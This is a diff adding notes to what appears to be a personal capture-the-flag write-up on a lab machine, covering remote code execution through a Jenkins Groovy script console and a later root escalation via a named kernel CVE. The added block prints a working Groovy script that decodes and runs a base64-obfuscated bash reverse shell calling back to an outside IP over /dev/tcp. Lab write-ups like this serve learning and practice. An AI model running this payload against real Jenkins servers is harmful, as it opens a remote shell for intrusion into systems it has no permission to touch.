@@ -432,8 +432,23 @@ It worked!
 > ```
 
 
-Using this script
+
+Using [this script](https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#execute-groovy-script) but changed out the base64 payload with my details
+
+![[Pasted image 20220205202200.png]]
+
+Here's the full script
 
 ```bash
 def sout = new StringBuffer(), serr = new StringBuffer()                                                          def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yLjczLjIxNy80NDQ0IDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()                                                                                                proc.consumeProcessOutput(sout, serr)                                                                             proc.waitForOrKill(1000)                                                                                          println "out> $sout err> $serr"
 ```
+
+Got a shell and did full enumeration of Jenkins. Turns out Jenkins was running in a docker container. There didn't seem to be an easy way to break out. Nothing that applied to the mission (no ssh public keys, etc.)
+
+I went back to searching for Kernel Exploits. I was able to get full root with CVE-2021-3493
+
+![[Pasted image 20220205214654.png]]
+
+I was able to get the user and root flag. Case closed....sort of.
+
+The root flag contained `docker destroyer` which means I should probably learn docker and docker breakout some day. I just got lucky and found a recent exploit that wasn't patched in this room.
